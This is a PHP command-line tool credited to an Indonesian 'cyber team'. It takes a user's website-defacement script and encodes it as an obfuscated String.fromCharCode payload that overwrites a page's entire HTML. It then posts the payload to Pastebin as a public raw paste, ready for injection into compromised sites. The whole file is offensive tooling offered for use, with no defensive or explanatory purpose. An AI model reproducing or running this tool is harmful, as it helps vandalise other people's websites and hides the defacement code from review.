<?php
error_reporting(0);
echo "\n";
echo "\e[1;36m##########################################\n";
echo "\e[1;36m#   Nicoleus Sitorus Script Auto Creator #\n";
echo "\e[1;36m#   SAMOSIR CYBER TEAM                   #\n";
echo "\e[1;36m#   Coded by Rizky Simamora              #\n";
echo "\e[1;36m#   Facebook : Nicoleus Sitorus          #\n";
echo "\e[1;36m# Github : https://github.com/Rizkysima/ #\n";
echo "\e[1;36m##########################################\n\n\n";
function convert($filename,$uy) {
$str2 = file_get_contents($filename);
$string = $str2;
    $decimalValues = array();
    for ($i = 0; $i < strlen($string); $i++) {
        $decimalValues[] = ord($string[$i]);
    }
    $mantodhex = implode(',', $decimalValues);
    if (!file_exists($filename)) {
    	exit();
   	} else {
	    $hekedbay = "document.documentElement.innerHTML=String.fromCharCode(".$mantodhex.")";
	    $open = fopen($uy, 'a');
	    fwrite($open, $hekedbay);
	    fclose($open);
	}
}
echo "\e[1;37m[×] Masukkan Script Deface Lae : ";
sleep (1);
$daface = trim(fgets(STDIN));
$ht = fopen('script.txt', 'w');
fwrite($ht, $daface);
fclose($ht);
$sc = "script.txt";
$file = fopen("convert.txt","w");
fwrite($file,"");
fclose($file);
$jso = "convert.txt";
if (!file_exists($sc)) {
	echo "\e[0;31m[!] Script Gagal Dibuat Lae\n";
} else {	
echo "\e[1;33m[~] Convert Your Script....\n";
sleep(3);
convert($sc,$jso);    
echo "\e[1;96m[Success Convert\e[1;96m] \e[0;92mSaved :$jso\n";
}
sleep (2);
function upload($data,$filename){
	$gettoken = file_get_contents("https://pastebin.com/index");
	preg_match("<input type=\"hidden\" name=\"csrf_token_post\" value=\"(.*?)\">", $gettoken, $token);
	$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://pastebin.com/post.php");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("content-type: application/x-www-form-urlencoded"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "csrf_token_post=".$token[1]."&submit_hidden=submit_hidden&paste_code=".$filename."&paste_format=1&paste_expire_date=N&paste_private=0&paste_name=".$data."");
$x = curl_exec($ch);
if(!curl_errno($ch))
{
	preg_match_all('/^Location:(.*)$/mi', $x, $matches);
	$query = !empty($matches[1]) ? trim($matches[1][0]) : 'No redirect found';
	if($query == "/warning.php?p=1")
	{
		print "\n[!] Telah mencapai batas maksimal (max: 10x)\n";
	} else{
		$linkpaste = "https://pastebin.com/raw".$query."\n\n";
		$file= fopen('pastebin.txt','a');
		fputs($file,$linkpaste);
		fclose($file);
		print "\n\e[1;32m[+] Upload Success :D\n";
		sleep (1);
		print "Check Your Script Rizky =>\e[1;37m $linkpaste\n";
	}
}
curl_close($ch);
}
function ngocok($gwejeneng)
{
    $acakwae = 'abcdefghijklmnopqrstuvwzyz1234567890';
    $string = '';
    for($i = 0; $i < $gwejeneng; $i++) {
        $pos = rand(0, strlen($acakwae)-1);
        $string .= $acakwae{$pos};
    }
    return $string;
}
$nama = ngocok(8);

if(!$file = file_get_contents($jso))
{
	echo "\e[0;31m[-] Gagal membuka $jso\n";
	exit();
}
else
{
    echo "\e[1;33m[+] Please Wait....\n";
    sleep (2);
    echo "\e[1;36m[~] Upload $jso\n";
    echo "Uploading....\n";
    sleep (3);
	$convertjso = $file;
	upload($nama,$convertjso);
}
 ?>
